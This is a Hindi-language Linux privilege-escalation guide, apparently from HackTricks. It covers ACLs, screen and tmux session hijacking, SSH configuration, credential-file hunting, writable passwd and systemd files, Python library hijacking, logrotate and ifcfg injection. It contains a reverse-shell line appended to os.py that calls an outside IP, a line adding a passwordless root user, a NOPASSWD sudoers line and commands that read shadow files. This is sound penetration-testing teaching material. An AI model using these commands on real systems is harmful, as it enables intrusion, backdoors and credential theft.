Linux capabilities किसी process को उपलब्ध root privileges का **एक subset प्रदान करती हैं**। इससे root **privileges छोटे और अलग-अलग units में बँट जाते हैं**। फिर इनमें से हर unit को processes को स्वतंत्र रूप से दिया जा सकता है। इस तरह privileges का पूरा set कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
Capabilities और उनका दुरुपयोग करने के तरीकों के बारे में **और जानने के लिए** यह page पढ़ें:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

किसी directory में **"execute" का bit** यह दर्शाता है कि प्रभावित user उस folder में "**cd**" कर सकता है।\
**"read"** bit का अर्थ है कि user **files** की **सूची देख सकता है**, और **"write"** bit का अर्थ है कि user नई **files** **बना** और **हटा** सकता है।

## ACLs

Access Control Lists (ACLs), discretionary permissions की secondary layer हैं, जो **पारंपरिक ugo/rwx permissions को override कर सकती हैं**। ये permissions उन specific users को अधिकार देने या उनसे अधिकार रोकने की सुविधा देकर file या directory access पर बेहतर नियंत्रण देती हैं, जो owner नहीं हैं या group का हिस्सा नहीं हैं। इस स्तर की **granularity से access management अधिक सटीक हो जाता है**। अधिक जानकारी [**यहाँ**](https://linuxconfig.org/how-to-manage-acls-on-linux) मिल सकती है।<sup>[[19]](#references)</sup>

किसी file पर user "kali" को read और write permissions **दें**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**सिस्टम से विशिष्ट ACLs वाली फ़ाइलें प्राप्त करें:**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-ins में छिपा ACL backdoor

एक आम misconfiguration यह है कि `/etc/sudoers.d/` में root-owned फ़ाइल का mode `440` होता है, फिर भी ACL के ज़रिए किसी low-priv user को write access मिलता है।

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

यदि आपको `user:alice:rw-` जैसा कुछ दिखे, तो प्रतिबंधात्मक mode bits के बावजूद user sudo rule जोड़ सकता है:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

यह high-impact ACL persistence/privesc path है, क्योंकि केवल `ls -l` से की गई समीक्षा में इसे आसानी से नज़रअंदाज़ किया जा सकता है।

## खुले हुए shell sessions

दूसरे users का GNU Screen तक access **केवल उसके version पर नहीं, बल्कि चल रहे session के configuration और ACL पर** निर्भर करता है। [GNU Screen के दस्तावेज़](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) के अनुसार, इसे multiuser support के साथ build किया जाना चाहिए; `multiuser on` और `acladd` या उपयुक्त `aclchg` grant किसी दूसरे user को attach करने की अनुमति देते हैं। [Manual में cross-user session lookup के लिए setuid-root होना भी आवश्यक है](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)। दिखाई देने वाला root-owned socket या अकेला SUID `screen` binary, attach किए जा सकने वाले root shell की पुष्टि नहीं करता। इसे escalation मानने से पहले पुष्टि करें कि live session multiuser है, मौजूदा user के पास प्रभावी input/command permission है, और उस session में चल रहा shell privileged owner के रूप में चलता है।

### screen sessions hijacking

**Screen sessions की सूची बनाएँ**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Socket के स्थान (कुछ सिस्टम इनमें से एक को दूसरे के symlink के रूप में दिखाते हैं): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**किसी session से जुड़ें**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

यह **पुराने tmux संस्करणों** में एक समस्या थी। मैं गैर-विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions की सूची बनाएं**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket के स्थान (कुछ सिस्टम में इनमें से एक दूसरे के symlink के रूप में उपलब्ध होता है) - tmux sessions hijacking: tmux -S /tmp/dev sess ls उस socket का उपयोग करके सूची देखें; आप उस socket में tmux session शुरू कर सकते हैं...](<../../images/image (837).png>)

**किसी session से जुड़ें**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

HTB के Valentine box को उदाहरण के लिए देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

ऐतिहासिक कमजोर अवधि के दौरान प्रभावित Debian या उसके derivative OpenSSL builds से जनरेट की गई keys में अनुमानित randomness हो सकती है; host का वर्तमान distribution या patched OpenSSL version यह साबित नहीं करता कि कोई पुरानी key कैसे जनरेट की गई थी। उपयुक्त ऐतिहासिक blacklist और उसकी provenance के आधार पर **विशिष्ट key** की जाँच करें। Debian का [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) public keys और `authorized_keys` की जाँच करने का तरीका बताता है, और [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) OpenSSL fix का रिकॉर्ड रखता है। किसी privileged account की `authorized_keys` में मौजूद entry escalation का संभावित रास्ता तभी है, जब उससे मेल खाने वाली private key हासिल की जा सके और प्रभावी SSH policy उस account के लिए उस key को अब भी स्वीकार करती हो; कमजोर **host** key अपने-आप में login credential नहीं होती। Compromised keys को बदलें और उनकी पुरानी authorizations हटाएँ।

### SSH की महत्वपूर्ण configuration values

- **PasswordAuthentication:** बताता है कि password authentication की अनुमति है या नहीं। Upstream OpenSSH का default `yes` है; distribution configuration इसे override कर सकती है।
- **PubkeyAuthentication:** बताता है कि public key authentication की अनुमति है या नहीं। इसका default `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, तो यह बताता है कि server खाली password strings वाले accounts में login की अनुमति देता है या नहीं। इसका default `no` है।

### Login control files

ये files प्रभावित करती हैं कि कौन और कैसे login कर सकता है:

- **`/etc/nologin`**: मौजूद होने पर, non-root logins को रोकती है और अपना message दिखाती है।
- **`/etc/securetty`**: यह सीमित करती है कि root कहाँ login कर सकता है (TTY allowlist)।
- **`/etc/motd`**: login के बाद दिखने वाला banner (इससे environment या maintenance की जानकारी leak हो सकती है)।

### PermitRootLogin

यह बताता है कि root, ssh का उपयोग करके login कर सकता है या नहीं। Upstream OpenSSH का default `prohibit-password` है; distribution configuration इसे override कर सकती है। संभावित values:

- `yes`: root, password और private key का उपयोग करके login कर सकता है
- `without-password` या `prohibit-password`: root केवल private key से login कर सकता है
- `forced-commands-only`: root केवल private key का उपयोग करके और commands options निर्दिष्ट होने पर ही login कर सकता है
- `no` : नहीं

### Trusted SSH user certificate authorities

`TrustedUserCAKeys` उन public keys के नाम बताता है जिन पर sshd, **user** certificates sign करने के लिए भरोसा करता है। यदि संबंधित private CA key किसी कम privilege वाले user के लिए readable है, तो जाँचें कि certificate कौन प्राप्त कर सकता है और उससे किन account principals के रूप में authenticate किया जा सकता है। `AuthorizedPrincipalsFile` या `AuthorizedPrincipalsCommand` स्वीकार किए जाने वाले नाम सीमित कर सकते हैं; इनमें से कोई भी configured न हो, तो certificate में target account का नाम होना चाहिए। `PermitRootLogin prohibit-password` root password authentication को रोकता है, लेकिन certificate authentication की अनुमति दे सकता है। केवल key path का exposed होना access साबित नहीं करता: public/private key pair, प्रभावी `Match` rules, account policy, key passphrase, revocation और स्वीकार किए जाने वाले signature algorithms की पुष्टि करें। Enumeration output में private-key bytes शामिल न करें। [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) देखें।

यदि privilege-delegation rule किसी user को key owner की identity के तहत बिना प्रतिबंध वाला [certificate signer, जैसे `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) चलाने देता है, तो private CA key उस user के लिए **readable न होने पर भी** उपयोग की जा सकती है। अनुमत command और arguments का signer account की key तक पहुँच, प्रभावी sshd configuration द्वारा trusted public CA, target account के लिए स्वीकार किए जाने वाले principal, certificate validity और उस account की login policy से मिलान करें। Delegated signer command या trusted CA file अकेले किसी दूसरे account तक access साबित नहीं करते; passive enumeration के दौरान test certificate sign न करें।

### AuthorizedKeysFile

यह उन files को निर्दिष्ट करता है जिनमें user authentication के लिए उपयोग की जा सकने वाली public keys होती हैं। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से बदल दिया जाएगा। **आप absolute paths** (जो `/` से शुरू होते हैं) या **user के home से relative paths** दे सकते हैं। उदाहरण के लिए:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

वह configuration बताएगी कि यदि आप user "**testusername**" की **private** key से login करने की कोशिश करते हैं, तो ssh आपकी key की public key की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद keys से करेगा।

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding से आप **अपने server पर keys (बिना passphrase वाली!) छोड़े बिना, उनकी जगह अपनी local SSH keys का उपयोग** कर सकते हैं। इस तरह, आप ssh के ज़रिए **एक host पर jump** कर पाएँगे और वहाँ से **दूसरे host पर jump** कर पाएँगे, **अपनी** **initial host** में मौजूद **key का उपयोग करके**।

आपको यह option `$HOME/.ssh.config` में इस तरह set करना होगा:

```
Host example.com
  ForwardAgent yes
```

ध्यान दें कि यदि `Host` हर बार `*` है, जब उपयोगकर्ता किसी दूसरी मशीन पर जाता है, तो उस होस्ट को keys तक पहुँच मिल सकती है (जो एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इन **options** को **ओवरराइड** कर सकती है और इस configuration को अनुमति दे सकती है या अस्वीकार कर सकती है।\
फ़ाइल `/etc/sshd_config`, `AllowAgentForwarding` keyword का उपयोग करके ssh-agent forwarding को **अनुमति** दे सकती है या **अस्वीकार** कर सकती है (डिफ़ॉल्ट रूप से अनुमति होती है)।

यदि आपको किसी environment में Forward Agent configured मिले, तो यह पेज पढ़ें, क्योंकि **आप इसका दुरुपयोग करके privileges escalate कर सकते हैं**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंदर की फ़ाइलें **ऐसी scripts हैं जो उपयोगकर्ता द्वारा नया shell चलाने पर execute होती हैं**। इसलिए, यदि आप **इनमें से किसी को भी लिख या संशोधित कर सकते हैं, तो आप privileges escalate कर सकते हैं**।

```bash
ls -l /etc/profile /etc/profile.d/
```

अगर कोई असामान्य profile script मिले, तो उसमें **संवेदनशील जानकारी** के लिए जाँच करें।

### Passwd/Shadow फ़ाइलें

OS के आधार पर `/etc/passwd` और `/etc/shadow` फ़ाइलों का नाम अलग हो सकता है या उनका बैकअप मौजूद हो सकता है। इसलिए **इन सभी को ढूँढ़ने** और **यह जाँचने** की सलाह दी जाती है कि क्या आप उन्हें पढ़ सकते हैं, ताकि पता चल सके कि फ़ाइलों में **hashes** हैं या नहीं:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

कुछ मामलों में आपको `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** मिल सकते हैं.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### लिखने योग्य /etc/passwd

सबसे पहले, निम्न में से किसी एक कमांड से पासवर्ड जनरेट करें।

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

फिर user `hacker` जोड़ें और जनरेट किया गया पासवर्ड सेट करें।

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

उदा.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `hacker:hacker` के साथ `su` कमांड का उपयोग कर सकते हैं।

वैकल्पिक रूप से, बिना पासवर्ड वाला डमी यूज़र जोड़ने के लिए आप निम्नलिखित पंक्तियों का उपयोग कर सकते हैं।\
चेतावनी: इससे मशीन की मौजूदा सुरक्षा कमज़ोर हो सकती है।

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

ध्यान दें: BSD platforms में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` में स्थित होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया जाता है।

आपको जाँचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप **किसी सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

उदाहरण के लिए, यदि मशीन पर **tomcat** server चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file में बदलाव कर सकते हैं,** तो आप इन पंक्तियों में बदलाव कर सकते हैं:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

आपका backdoor अगली बार tomcat शुरू होने पर execute होगा।

### फ़ोल्डरों की जाँच करें

इन फ़ोल्डरों में backups या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आख़िरी फ़ोल्डर को पढ़ नहीं पाएँगे, फिर भी कोशिश करें)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### असामान्य स्थान/स्वामित्व वाली फ़ाइलें

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### पिछले कुछ मिनटों में संशोधित फ़ाइलें

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB फ़ाइलें

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

पढ़ने योग्य application databases में, usernames और password hashes के लिए table और column names की जांच करें। किसी hash को ढूंढ़ना, उसका password recover करना और यह साबित करना कि वह किसी local account के लिए दोबारा इस्तेमाल हुआ है—अलग-अलग चरण हैं; केवल 32 अक्षरों की सामान्य hexadecimal string से MD5 या account access का अनुमान नहीं लगाया जा सकता।

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

यदि readable shell history में `sudo` command के बाद password जैसी कोई छोटी line हो, तो आसपास की lines को स्वयं ध्यान से देखें। सामान्य `sudo` prompt में दर्ज किया गया password shell history में सेव नहीं होता; उसके बाद की line केवल गलती से shell में दर्ज किया गया input हो सकती है, यह मान्य password का प्रमाण नहीं है। `.sudo_as_admin_successful` marker पहले के उपयोग को दर्ज करता है, वर्तमान authorization को नहीं।

### Hidden files

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH में Script/Binaries**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **वेब फ़ाइलें**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **बैकअप**

बैकअप डायरेक्टरी के अंदर मौजूद पढ़ी जा सकने वाली फ़ाइलों के साथ-साथ उन फ़ाइलों की भी जाँच करें जिनके **नाम** में `backup` हो: अस्पष्ट नाम वाले या encrypted extension वाले archive में भी पुराने application data उजागर हो सकते हैं। Encrypted archive केवल संभावित exposure है। Password recovery, उसकी सामग्री की जाँच, application hash की recovery, और उस password को Unix account के लिए दोबारा इस्तेमाल करना—ये अलग-अलग चरण हैं जिनकी पुष्टि करनी होगी; archive में मौजूद hash से यह साबित नहीं होता कि उससे local login किया जा सकता है।

पढ़े जा सकने वाले virtual-machine backups की भी इसी तरह जाँच करें। VirtualBox की `.vbox` configuration, attached `.vdi` images की पहचान कर सकती है और encrypted disk-key metadata रख सकती है; [VirtualBox दस्तावेज़ बताता है कि encrypted data key VM configuration में stored होती है](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)। Offline disk review तभी संभव है जब configuration और image—दोनों तक पहुँच हो। Guest volume की अपनी [LUKS encryption layer](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) हो सकती है, जिसके लिए अलग key की ज़रूरत होगी। अधिकृत decryption के बाद भी पुरानी scripts या configuration में password हो सकता है; इसे local escalation कहने से पहले पुष्टि करें कि credential किसी host account के लिए अभी भी मान्य है और उसकी प्रभावी `sudo` policy किसी privileged command को चलाने की अनुमति देती है। Passive enumeration के दौरान images को copy, decrypt या mount किए बिना paths और permissions की सूची बनाएँ।

किसी पढ़े जा सकने वाले archive की जाँच करते समय, कुछ भी extract करने से पहले उसके member names की सूची देखें: छिपी हुई authenticator files, recovery-code सामग्री या SSH keys मौजूद हो सकती हैं, भले ही live copies सुरक्षित हों। फ़ाइल नाम केवल एक सुराग देते हैं; सामग्री और किसी भी account reuse की अलग से पुष्टि करें।

बैकअप डायरेक्टरी में **दूसरे user के स्वामित्व वाले पढ़े जा सकने वाले archives** को प्राथमिकता दें, खासकर root के स्वामित्व वाले archives और वे जिन्हें group membership के ज़रिए access किया जा सकता है। पुराने archive में configuration या authentication secret हो सकता है, भले ही live copy सुरक्षित हो। [Backrest](https://garethgeorge.github.io/backrest/) जैसे local backup UI के लिए, service का प्रभावी account जाँचें और पता करें कि क्या कम privileges वाला user इसकी configuration पढ़ सकता है या UI में authenticate कर सकता है। इसके [hooks](https://garethgeorge.github.io/backrest/docs/hooks) और [restic command interface](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) daemon के file और command privileges के साथ काम कर सकते हैं; केवल loopback listener से impact तय नहीं होता। Backrest का `passwordBcrypt`, इसकी [authentication code](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go) में base64-encoded bcrypt hash है, plaintext password नहीं। Exposed archive या UI को privilege boundary मानने से पहले service identity, इस्तेमाल किए जा सकने वाले credentials और संबंधित plan या repository तक access की पुष्टि करें।

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### पासवर्ड वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का कोड देखें। यह **कई ऐसी संभावित फ़ाइलें खोजता है जिनमें पासवर्ड हो सकते हैं**।\
ऐसा करने के लिए एक **और दिलचस्प टूल** है: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), जो एक open source application है और Windows, Linux और Mac पर स्थानीय कंप्यूटर में संग्रहित कई पासवर्ड निकालने के लिए इस्तेमाल किया जाता है।

अगर `/etc/guacamole/guacamole.properties` पढ़ी जा सकती है, तो उसकी `mysql-*`, `postgresql-*` या `sqlserver-*` database connection settings देखें। यदि खाते को Guacamole JDBC tables पढ़ने की अनुमति है, तो `guacamole_connection_parameter` में सहेजे गए SSH `username`, `password`, `private-key` या `passphrase` मान हो सकते हैं। पहले connection IDs और parameter names देखें, फिर केवल संबंधित rows की जाँच करें; सहेजा गया मान किसी पुनः उपयोग किए जा सकने वाले secret के बजाय dynamic token या vault reference भी हो सकता है। [Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) और [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html) देखें।

[pswm password manager](https://github.com/Julynx/pswm#usage) डिफ़ॉल्ट रूप से `~/.local/share/pswm/pswm` पर encrypted vault रखता है। अगर किसी अन्य उपयोगकर्ता का vault दिखाई दे, तो उसका ownership और यह जाँचें कि आपका खाता उसे वास्तव में पढ़ सकता है या नहीं। केवल vault path से credentials का पता नहीं चलता; उसका master password recover करना, किसी पुनः उपयोग किए जा सकने वाले खाते का पासवर्ड ढूँढ़ना और उस खाते के privileges की पुष्टि करना अलग-अलग चरण हैं।

[Passpie का डिफ़ॉल्ट database](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) `~/.passpie/` है, जिसमें `.keys` keyring और group directories के भीतर encrypted `.pass` credential files होती हैं। दिखाई देने वाली database directory केवल एक path lead है: key और संबंधित encrypted entry तक पहुँच, आवश्यक master passphrase, और यह पुष्टि करें कि recovered credential किसी अधिक privileged खाते का है या नहीं। Passpie [custom database paths](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) भी support करता है, इसलिए डिफ़ॉल्ट path सभी संभावनाओं को शामिल नहीं करता। Automated enumeration में credentials export करने या key material दिखाने के बजाय metadata की सूची बनानी चाहिए।

### लॉग्स

अगर आप logs पढ़ सकते हैं, तो उनमें **दिलचस्प/गोपनीय जानकारी मिल सकती है**। Log जितना अजीब होगा, वह उतना ही दिलचस्प होगा (शायद)।\
इसके अलावा, कुछ ठीक से configured न किए गए (backdoored?) **audit logs** में **पासवर्ड रिकॉर्ड** किए जा सकते हैं, जैसा कि इस post में बताया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

लॉग पढ़ने के लिए **समूह** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) बहुत मददगार होगा।

### Shell फ़ाइलें

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generic Creds Search/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके **नाम** या **कंटेंट** में "**password**" शब्द हो, और लॉग्स में IPs और emails, या hashes regexps भी खोजने चाहिए।\
मैं यहाँ यह सब करने का तरीका नहीं बताऊँगा, लेकिन अगर आपकी रुचि है, तो आप [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा किए जाने वाले आखिरी checks देख सकते हैं।

## लिखने योग्य फ़ाइलें

### Python library hijacking

अगर आपको पता है कि python script **कहाँ से** execute होने वाली है और आप उस फ़ोल्डर में **लिख सकते हैं** या python libraries **modify कर सकते हैं**, तो आप OS library को modify करके उसमें backdoor डाल सकते हैं (अगर आप उस जगह लिख सकते हैं जहाँ से python script execute होने वाली है, तो os.py library को copy और paste करें)।

**Library में backdoor डालने के लिए**, os.py library के अंत में यह line जोड़ें (IP और PORT बदलें):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate exploitation

एक privileged `logrotate` job, अलग-अलग users के बीच file-write का रास्ता बना सकता है, यदि वह ऐसी directory के भीतर मौजूद log को वास्तव में rotate करता है जिसे कम privilege वाला user rotation के दौरान बदल या redirect कर सकता है। केवल writable log मिलना जांच के लिए एक संकेत है। सटीक सक्रिय rule और उसके `create`, `olddir`, तथा `su` directives की पुष्टि करें; scheduler की प्रभावी identity; log के parent पर write और search permissions; और यह कि installed build तथा policy destination बदलने की अनुमति देते हैं या नहीं। Startup-file write से command execution होने के लिए बाद में privileged shell को उस file को load भी करना होगा। Rotation को trigger किए बिना या race आज़माए बिना schedule, rule, version/packaging, और path metadata की जांच करें।

> [!TIP]
> `3.18.0` या किसी भी version string को अकेले exploitability की सीमा न मानें। [Upstream के change log](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) में कई releases में directory और symlink hardening दर्ज है, और distributions fixes को backport कर सकती हैं। [Upstream manual](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) सलाह देता है कि जब root, non-privileged users के नियंत्रण वाली directories में logs rotate करे, तो `su` का इस्तेमाल करें; प्रभावी rule और वास्तविक व्यवहार की पुष्टि करें।

इस vulnerability की अधिक विस्तृत जानकारी इस पेज पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

आप इस vulnerability का exploit करने के लिए [**logrotten**](https://github.com/whotwagner/logrotten) का इस्तेमाल कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** से बहुत मिलती-जुलती है। इसलिए, जब भी आपको पता चले कि आप logs बदल सकते हैं, तो जांचें कि उन logs का प्रबंधन कौन कर रहा है और क्या symlinks से logs को बदलकर privileges escalate किए जा सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

जब कम privilege वाला user `ifcfg-*` file बना या बदल सकता हो **और** कोई privileged network-activation path उस सटीक file को पढ़ता हो, तो यह file जांच के लिए एक संकेत है। प्रभावी file और directory permissions, चुने गए interface, installed `ifup`/`ifdown` implementation, और उसे invoke करने वाले की पुष्टि करें। केवल writable file से execution नहीं होता। [Red Hat की RHEL 7 networking guide](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) legacy network scripts और NetworkManager में अंतर बताती है: NetworkManager अपने-आप legacy scripts को trigger नहीं करता। [RHEL 8 के दस्तावेज़](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) बताते हैं कि उसका default `ifup`/`ifdown`, NetworkManager का इस्तेमाल करता है, जबकि optional legacy package shell scripts देता है।

जिस system में वास्तव में privileged legacy scripts इस्तेमाल हो रही हों, वहां unquoted और shell-sourced `ifcfg-*` assignment, जैसे `NAME=`, code-execution boundary पार कर सकता है। सटीक parser, value, और activation path की पुष्टि करें; filename या NetworkManager की मौजूदगी के आधार पर shell interpretation का अनुमान न लगाएं। ऐसा sudo-allowed wrapper, जो caller के input को `ifcfg-*` file में लिखता है और फिर legacy `ifup` call करता है, इस boundary तक पहुंचने का एक अलग रास्ता है—भले ही caller file को सीधे edit न कर सके।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network और /bin/id के बीच की खाली जगह पर ध्यान दें_)

### **init, init.d, systemd, और rc.d**

`/etc/init.d` डायरेक्टरी में System V init (SysVinit) के **scripts** होते हैं, जो **क्लासिक Linux सेवा प्रबंधन प्रणाली** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के scripts शामिल हैं। इन्हें सीधे या `/etc/rc?.d/` में मौजूद symbolic links के ज़रिए चलाया जा सकता है। Redhat systems में इसका एक वैकल्पिक path `/etc/rc.d/init.d` है।

